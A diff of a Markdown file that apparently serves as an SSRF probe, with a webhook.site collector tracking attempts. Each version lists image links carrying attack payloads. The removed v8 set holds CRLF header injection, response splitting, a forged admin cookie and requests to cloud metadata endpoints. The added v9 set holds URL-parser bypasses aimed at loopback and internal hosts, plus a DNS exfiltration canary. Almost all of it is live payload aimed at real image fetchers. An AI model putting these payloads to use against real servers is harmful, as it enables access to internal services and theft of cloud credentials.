@@ -1,57 +1,65 @@
-# SSRF v8 - Advanced CRLF Header Injection
+# SSRF v9 - Hostname Injection & Edge Cases
 
-## HTTP Response Splitting
+## Hostname with CRLF (via user:pass@)
 
-![r1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/r1%0d%0aHTTP/1.1%20200%20OK%0d%0aContent-Type:%20text/html%0d%0a%0d%0a<script>alert(1)</script>.gif)
+![u1](https://admin:pass%0d%0aHost:%20127.0.0.1@webhook.site/u1.gif)
 
-![r2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/r2%0d%0aSet-Cookie:%20admin=true%0d%0a%0d%0a.gif)
+![u2](https://user%0d%0aHost:%20internal:pass@webhook.site/u2.gif)
 
-## Absolute URI Injection
+## Hostname with Encoded Characters
 
-![a1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/a1%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0a%0d%0aGET%20http://169.254.169.254/latest/meta-data/.gif)
+![h1](https://webhook%2esite/136e610f-df46-485b-b57e-d42604727ca2/h1.gif)
 
-![a2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/a2%20HTTP/1.0%0d%0aHost:%20metadata.google.internal%0d%0a%0d%0aGET%20/.gif)
+![h2](https://webhook．site/136e610f-df46-485b-b57e-d42604727ca2/h2.gif)
 
-## Host Override Techniques
+## @ Symbol Tricks
 
-![o1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/o1%0d%0a%0d%0aGET%20/%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aConnection:%20close%0d%0a%0d%0a.gif)
+![at1](https://webhook.site@evil.com/136e610f-df46-485b-b57e-d42604727ca2/at1.gif)
 
-![o2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/o2%0d%0aX-Rewrite-URL:%20/admin%0d%0a.gif)
+![at2](https://evil.com%40webhook.site/136e610f-df46-485b-b57e-d42604727ca2/at2.gif)
 
-![o3](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/o3%0d%0aX-Original-URL:%20/admin%0d%0a.gif)
+## Backslash Confusion
 
-## Cache Poisoning Headers
+![bs1](https://webhook.site\@127.0.0.1/136e610f-df46-485b-b57e-d42604727ca2/bs1.gif)
 
-![c1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/c1%0d%0aX-Forwarded-Scheme:%20nothttps%0d%0a.gif)
+![bs2](https://webhook.site%5c@127.0.0.1/bs2.gif)
 
-![c2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/c2%0d%0aX-Forwarded-Proto:%20https%0d%0aX-Forwarded-Port:%20443%0d%0a.gif)
+## IDN/Punycode Tests
 
-## Internal Routing Headers
+![idn1](https://ⓦⓔⓑⓗⓞⓞⓚ.site/136e610f-df46-485b-b57e-d42604727ca2/idn1.gif)
 
-![i1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/i1%0d%0aX-Backend-Server:%20internal.github.net%0d%0a.gif)
+## Fragment Identifier Tricks
 
-![i2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/i2%0d%0aX-Custom-IP-Authorization:%2010.0.0.1%0d%0a.gif)
+![frag1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/frag1#@169.254.169.254/latest/meta-data/.gif)
 
-![i3](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/i3%0d%0aX-Real-IP:%20127.0.0.1%0d%0a.gif)
+![frag2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/frag2%23@internal/.gif)
 
-## HTTP/2 Pseudo-headers
+## Port Tricks
 
-![h2a](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/h2a%0d%0a:authority:%20169.254.169.254%0d%0a.gif)
+![port1](https://webhook.site:80/136e610f-df46-485b-b57e-d42604727ca2/port1.gif)
 
-![h2p](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/h2p%0d%0a:path:%20/latest/meta-data/%0d%0a.gif)
+![port2](https://webhook.site:443/136e610f-df46-485b-b57e-d42604727ca2/port2.gif)
 
-## Connection Manipulation
+![port3](https://webhook.site:8080/136e610f-df46-485b-b57e-d42604727ca2/port3.gif)
 
-![conn1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/conn1%0d%0aConnection:%20keep-alive%0d%0aKeep-Alive:%20timeout=9999%0d%0a.gif)
+## IPv6 Tricks
 
-![conn2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/conn2%0d%0aUpgrade:%20websocket%0d%0aConnection:%20Upgrade%0d%0a.gif)
+![ipv1](https://[::ffff:7f00:1]/136e610f-df46-485b-b57e-d42604727ca2/ipv1.gif)
 
-## DNS Canaries for v8
+## URL with Tab/Space
 
-![dns1](https://v8-response-split.136e610f-df46-485b-b57e-d42604727ca2.dnshook.site/dns1.gif)
+![ws1](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/ws1%09tab.gif)
 
-![dns2](https://v8-header-inject.136e610f-df46-485b-b57e-d42604727ca2.dnshook.site/dns2.gif)
+![ws2](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/ws2%20space.gif)
+
+## Basic v9 Canary
+
+![v9](https://webhook.site/136e610f-df46-485b-b57e-d42604727ca2/v9-canary.gif)
+
+## DNS Exfiltration v9
+
+![dns1](https://v9-hostname-test.136e610f-df46-485b-b57e-d42604727ca2.dnshook.site/dns1.gif)
 
 ---
 
-*v8: Advanced CRLF - Testing actual header injection impact*
+*v9: Hostname and edge case testing*
